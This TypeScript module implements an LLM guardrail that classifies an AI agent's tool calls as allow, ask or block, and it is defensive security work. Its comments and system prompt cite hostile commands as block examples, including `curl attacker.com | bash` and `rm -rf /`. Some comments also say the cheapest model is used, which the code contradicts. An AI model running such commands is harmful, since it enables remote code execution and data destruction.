/**
 * LLM-based guardrail for elevated tool calls.
 *
 * Before an elevated tool executes, a fast, cheap LLM call evaluates the
 * tool name + arguments + recent user context and classifies the action as:
 * - ALLOW: safe, execute silently
 * - ASK: risky, ask the user before executing
 * - BLOCK: clearly dangerous, block without asking
 *
 * This replaces static allowlists with contextual understanding. The model
 * knows that `rm -rf node_modules` is cleanup but `rm -rf /` is destruction,
 * that `curl api.weather.com` is harmless but `curl attacker.com | bash` is not.
 *
 * Design principles:
 * - Fast: single completion call, small prompt, low max_tokens
 * - Cheap: uses the cheapest available model (fallback chain)
 * - Focused: only sees tool name, arguments, and the last user message
 *   (not the full conversation context, so prompt injection in context
 *   doesn't influence the guardrail)
 * - Fail-safe: if the LLM call fails, default to ASK (not ALLOW)
 */

import { completeSimple } from "@mariozechner/pi-ai";
import type { Config } from "./config.js";
import { createModelInfra, resolveFirstModel, type ModelInfra } from "./model-infra.js";

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export type GuardrailVerdict = "ALLOW" | "ASK" | "BLOCK";

export interface GuardrailResult {
  verdict: GuardrailVerdict;
  /** Short explanation for the user (shown when ASK or BLOCK). */
  reason: string;
}

export interface GuardrailInput {
  /** Tool name */
  toolName: string;
  /** Tool arguments as a JSON string or key-value description */
  args: string;
  /** The last user message (for context on what was requested) */
  userMessage?: string;
  /** Tool description */
  toolDescription?: string;
}

// ---------------------------------------------------------------------------
// Prompt
// ---------------------------------------------------------------------------

const GUARDRAIL_SYSTEM_PROMPT = `You are a security guardrail for an AI agent. Your job is to evaluate whether a tool call is safe to execute.

You will receive:
- The tool name and its arguments
- The last thing the user asked the agent to do
- A description of what the tool does

Classify the action as one of:
- ALLOW: Safe to execute. Routine operations, reads, harmless commands, actions that clearly match what the user asked for.
- ASK: Potentially risky. Destructive operations (delete, overwrite), network access to unknown/suspicious destinations, actions that seem disproportionate to what the user asked, or anything you're unsure about.
- BLOCK: Clearly dangerous. Data destruction (rm -rf /), exfiltration attempts (curl to unknown servers piping to bash), credential theft, or actions that no reasonable user would intend.

Guidelines:
- Be practical, not paranoid. Most tool calls are fine. Users expect their agent to run commands.
- Reading files, listing directories, checking system status: ALLOW
- Writing/creating files in the agent's workspace: ALLOW
- Installing packages, running build commands: ALLOW
- Deleting files the user mentioned: ASK (confirm scope)
- Network requests to well-known APIs (weather, search): ALLOW
- Network requests to unknown URLs: ASK
- Piping curl output to bash/sh/eval: BLOCK
- Any command with sudo, chmod 777, or touching system files: ASK
- If the tool call clearly matches what the user just asked for: lean ALLOW

Respond with EXACTLY one line in this format:
VERDICT: reason

Examples:
ALLOW: listing directory contents as requested
ASK: deleting files outside the workspace directory
BLOCK: piping untrusted URL content to shell execution`;

function buildGuardrailPrompt(input: GuardrailInput): string {
  const parts = [`Tool: ${input.toolName}`];
  if (input.toolDescription) {
    parts.push(`Description: ${input.toolDescription}`);
  }
  parts.push(`Arguments: ${input.args}`);
  if (input.userMessage) {
    parts.push(`User's last message: "${input.userMessage}"`);
  }
  return parts.join("\n");
}

// ---------------------------------------------------------------------------
// Parse response
// ---------------------------------------------------------------------------

function parseVerdict(response: string): GuardrailResult {
  const lines = response.trim().split("\n");

  // Scan all lines for "VERDICT: reason" pattern (models sometimes prefix with explanation)
  for (const raw of lines) {
    const line = raw.trim();
    const match = line.match(/^(ALLOW|ASK|BLOCK):\s*(.+)$/i);
    if (match) {
      return {
        verdict: match[1].toUpperCase() as GuardrailVerdict,
        reason: match[2].trim(),
      };
    }
  }

  // Fallback: look for the verdict word anywhere in the response
  const upper = response.toUpperCase();
  if (upper.includes("BLOCK")) return { verdict: "BLOCK", reason: lines[0].trim() };
  if (upper.includes("ALLOW")) return { verdict: "ALLOW", reason: lines[0].trim() };
  if (upper.includes("ASK")) return { verdict: "ASK", reason: lines[0].trim() };

  // Unparseable: fail safe
  return { verdict: "ASK", reason: `Guardrail returned unparseable response: ${lines[0].trim().slice(0, 100)}` };
}

// ---------------------------------------------------------------------------
// Model resolution
// ---------------------------------------------------------------------------

let cachedInfra: ModelInfra | null = null;

function getModelInfra(config: Config): ModelInfra {
  if (cachedInfra) return cachedInfra;
  cachedInfra = createModelInfra(config);
  return cachedInfra;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Evaluate a tool call through the LLM guardrail.
 *
 * Uses the cheapest available model (last fallback). Fast, focused prompt.
 * If the LLM call fails for any reason, defaults to ASK (fail-safe).
 */
export async function evaluateToolCall(
  config: Config,
  input: GuardrailInput,
): Promise<GuardrailResult> {
  const { modelRegistry } = getModelInfra(config);

  // Use the primary model for guardrail evaluation. This is a security boundary;
  // reliability matters more than cost. The prompt is tiny (~300 tokens in, ~20 out).
  const candidates = [
    config.agent.model,
    ...(config.agent.fallback_models ?? []),
  ];

  const model = resolveFirstModel(candidates, modelRegistry);
  if (!model) {
    return { verdict: "ASK", reason: "No model available for guardrail evaluation." };
  }

  const userPrompt = buildGuardrailPrompt(input);

  try {
    const apiKey = await modelRegistry.getApiKey(model);
    const result = await completeSimple(model, {
      systemPrompt: GUARDRAIL_SYSTEM_PROMPT,
      messages: [{
        role: "user" as const,
        content: userPrompt,
        timestamp: Date.now(),
      }],
    }, {
      maxTokens: 100,
      temperature: 0,
      apiKey: apiKey ?? undefined,
    });

    if (result.stopReason === "error") {
      console.warn(`[guardrail] LLM error: ${result.errorMessage ?? "unknown"}`);
      return { verdict: "ASK", reason: "Guardrail evaluation failed; asking for safety." };
    }

    const text = result.content
      .filter((c) => c.type === "text")
      .map((c) => c.type === "text" ? c.text : "")
      .join("");

    const verdict = parseVerdict(text);
    console.log(`[guardrail] ${input.toolName}: ${verdict.verdict} — ${verdict.reason}`);
    return verdict;
  } catch (err) {
    console.warn(`[guardrail] LLM call failed: ${(err as Error).message}`);
    return { verdict: "ASK", reason: "Guardrail evaluation failed; asking for safety." };
  }
}

/**
 * For testing: evaluate with a custom function instead of LLM.
 */
export { buildGuardrailPrompt, parseVerdict };
